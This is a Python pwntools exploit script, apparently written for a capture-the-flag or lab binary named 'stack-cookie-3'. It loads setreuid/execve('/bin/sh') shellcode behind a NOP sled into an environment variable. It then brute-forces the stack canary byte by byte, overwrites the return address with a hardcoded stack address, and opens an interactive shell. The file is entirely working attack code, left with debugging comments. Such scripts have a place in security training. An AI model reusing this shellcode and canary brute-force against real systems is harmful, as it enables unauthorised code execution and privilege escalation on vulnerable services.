#! /usr/bin/env python

from pwn import *
import time


shellcode = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc91\xd2j\x0bXShn/shh//bi\x89\xe3\xcd\x80'
shellcode = "\x90" *3000 + shellcode
env = {'SHELLCODE' : shellcode}
p = process ('./stack-cookie-3', env=env)
print (p.recv())



#gdb.attach(p)

context.terminal = ['tmux', 'splitw', '-h']



#buffer = "A" * 0x84 + p32(addr_stack_cookie) + "AAAA" + shellcode

#p.sendline(buffer)
#c = Core('core')
#buf_addr = c.stack.find(buffer)
#print(hex(buf_addr))

#f = open("c.txt", "w")
#f.write(buffer)
#f.close()

buffer = "A"*80

while (len(buffer)) < 0x80:
    buffer += "\x90"

buffer  += chr(0)
#print (len(buffer))

p.sendline(str(len(buffer)))
print(p.recv())
p.send(buffer)
print(p.recv())


while (len(buffer)) < 0x84:
    buf = buffer
    i = 0
    while i < 256:
        print (i)
        buffer = buf
        buffer += chr(i)
        p.sendline(str(len(buffer)))
        time.sleep(0.05)
        print(p.recv())
        p.send(buffer)
        time.sleep(0.05)
        #print(p.recv())
        response = p.recvline_contains("Exit status:")
        #print(p.recv())
        if "Exit status: 0" in response:
            break;
        i += 1


print(len(buffer))
time.sleep(0.1)
p.sendline(str(len(buffer)))
time.sleep(0.1)
print(p.recv())
time.sleep(0.1)
p.send(buffer)
time.sleep(0.1)
print(p.recv())
#p.interactive()

#0xffffd408

buffer += "AAAA"+ "BBBB" + "CCCC" + p32(0xffffd408)

#c = Core('./core')

#buffer_addr = c.stack.find(buffer)

#print(hex(buffer_addr))

#buffer = p32(some_function)
#while (len(buffer)) < 0x100:
#    buffer += p32(some_function)

#print(p.recv())
print(len(buffer))
time.sleep(0.1)
p.sendline(str(len(buffer)))
time.sleep(0.1)
print(p.recv())
time.sleep(0.1)
p.send(buffer)

c = Core('core')

shell_addr = c.stack.find(shellcode)

print(hex(shell_addr))
#buffer += p32(shell_addr)



time.sleep(0.1)
print(p.recv())
p.interactive()
